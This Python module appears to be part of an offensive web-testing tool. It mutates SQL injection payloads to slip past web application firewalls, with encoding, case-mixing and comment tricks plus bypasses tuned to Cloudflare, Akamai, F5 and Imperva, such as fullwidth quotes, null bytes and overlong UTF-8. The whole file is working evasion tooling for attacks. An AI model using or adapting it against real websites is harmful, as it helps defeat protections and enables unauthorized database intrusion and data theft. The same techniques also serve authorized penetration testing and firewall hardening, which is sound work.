"""
Payload mutation engine for WAF bypass.
Generates multiple encoding/obfuscation variants of a base payload.
"""
from __future__ import annotations
import urllib.parse
import re
from dataclasses import dataclass
from typing import Optional


WAF_TYPES = {"cloudflare", "akamai", "f5", "imperva", "sucuri", "generic", None}

SQL_KEYWORDS = ["SELECT", "UNION", "AND", "OR", "WHERE", "INSERT", "UPDATE",
                "DELETE", "FROM", "ORDER", "GROUP", "HAVING", "WAITFOR",
                "DELAY", "SLEEP", "BENCHMARK", "CONCAT", "CONVERT", "CAST"]

DB_ERROR_PATTERNS = [
    r"microsoft.*sql.*server", r"unclosed quotation mark",
    r"incorrect syntax near", r"you have an error in your sql syntax",
    r"warning.*mysql_", r"pg_query\(\):", r"ora-[0-9]{5}",
    r"sql syntax.*error", r"database error",
]


@dataclass
class MutationResult:
    original: str
    mutations: list[str]
    waf_type: Optional[str]

    @property
    def all_payloads(self) -> list[str]:
        """Original + all mutations, deduplicated, original first."""
        seen = {self.original}
        result = [self.original]
        for m in self.mutations:
            if m not in seen and m.strip():
                seen.add(m)
                result.append(m)
        return result


class PayloadMutator:
    """
    Generate WAF-bypass mutations for a given payload.
    Uses detected WAF type to apply targeted bypass techniques.
    """

    def mutate(self, payload: str, waf_type: Optional[str] = None) -> MutationResult:
        """
        Generate payload mutations.

        Args:
            payload: The base payload string
            waf_type: WAF type from WAFProfiler (cloudflare/akamai/f5/imperva/None)

        Returns:
            MutationResult with all_payloads property
        """
        mutations = []

        mutations.extend(self._url_encoding_mutations(payload))
        mutations.extend(self._case_variation_mutations(payload))
        mutations.extend(self._comment_injection_mutations(payload))

        waf = (waf_type or "generic").lower()
        if waf == "cloudflare":
            mutations.extend(self._cloudflare_bypasses(payload))
        elif waf == "akamai":
            mutations.extend(self._akamai_bypasses(payload))
        elif waf == "f5":
            mutations.extend(self._f5_bypasses(payload))
        elif waf == "imperva":
            mutations.extend(self._imperva_bypasses(payload))
        else:
            mutations.extend(self._generic_bypasses(payload))

        return MutationResult(original=payload, mutations=mutations, waf_type=waf_type)

    # ── Category 1: URL Encoding ──────────────────────────────────────────

    def _url_encoding_mutations(self, payload: str) -> list[str]:
        mutations = []

        encoded = urllib.parse.quote(payload, safe="")
        if encoded != payload:
            mutations.append(encoded)

        double = urllib.parse.quote(encoded, safe="")
        if double != encoded:
            mutations.append(double)

        partial = payload.replace("'", "%27").replace(" ", "%20").replace('"', "%22")
        if partial != payload:
            mutations.append(partial)

        hex_apos = payload.replace("'", "0x27")
        if hex_apos != payload:
            mutations.append(hex_apos)

        return mutations

    # ── Category 2: Case Variation ────────────────────────────────────────

    def _case_variation_mutations(self, payload: str) -> list[str]:
        mutations = []

        varied = payload
        for keyword in SQL_KEYWORDS:
            if keyword in payload.upper():
                mixed = "".join(
                    c.upper() if i % 2 == 0 else c.lower()
                    for i, c in enumerate(keyword)
                )
                varied = re.sub(keyword, mixed, varied, flags=re.IGNORECASE)

        if varied != payload:
            mutations.append(varied)

        lower = payload.lower()
        if lower != payload:
            mutations.append(lower)

        return mutations

    # ── Category 3: Comment Injection ────────────────────────────────────

    def _comment_injection_mutations(self, payload: str) -> list[str]:
        mutations = []

        if " " in payload:
            mutations.append(payload.replace(" ", "/**/"))
            mutations.append(payload.replace(" ", "%09"))
            mutations.append(payload.replace(" ", "%0a"))
            mutations.append(payload.replace(" ", "%0d%0a"))

        return mutations

    # ── Category 4: WAF-Specific Bypasses ────────────────────────────────

    def _cloudflare_bypasses(self, payload: str) -> list[str]:
        bypasses = []

        bypasses.append(payload.replace("'", "＇"))

        if payload.endswith("--"):
            bypasses.append(payload[:-2] + "--+-")

        bypasses.append(payload.replace(" ", "\r"))

        bypasses.append(urllib.parse.quote(payload, safe="'=()"))

        return bypasses

    def _akamai_bypasses(self, payload: str) -> list[str]:
        bypasses = []

        bypasses.append(payload.replace("AND", "&&"))
        bypasses.append(payload.replace("OR", "||"))

        bypasses.append(payload.replace(" ", "\t"))
        bypasses.append(payload.replace(" ", "\n"))

        return bypasses

    def _f5_bypasses(self, payload: str) -> list[str]:
        bypasses = []

        bypasses.append(payload.replace("'", "%u0027"))

        bypasses.append(payload.replace("'", "'%00"))

        bypasses.append(payload.replace(" ", "%c0%a0"))

        return bypasses

    def _imperva_bypasses(self, payload: str) -> list[str]:
        bypasses = []

        bypasses.append(re.sub(r"\b(\d+)\b", r"\1e0", payload))

        bypasses.append(payload.replace("=", " LIKE "))

        bypasses.append(payload.replace("'", "&#39;").replace('"', "&quot;"))

        return bypasses

    def _generic_bypasses(self, payload: str) -> list[str]:
        bypasses = []

        bypasses.append(payload.replace("'", "%27"))
        bypasses.append(payload.replace(" ", "/**/"))
        bypasses.append(payload.replace(" ", "%20"))

        return bypasses
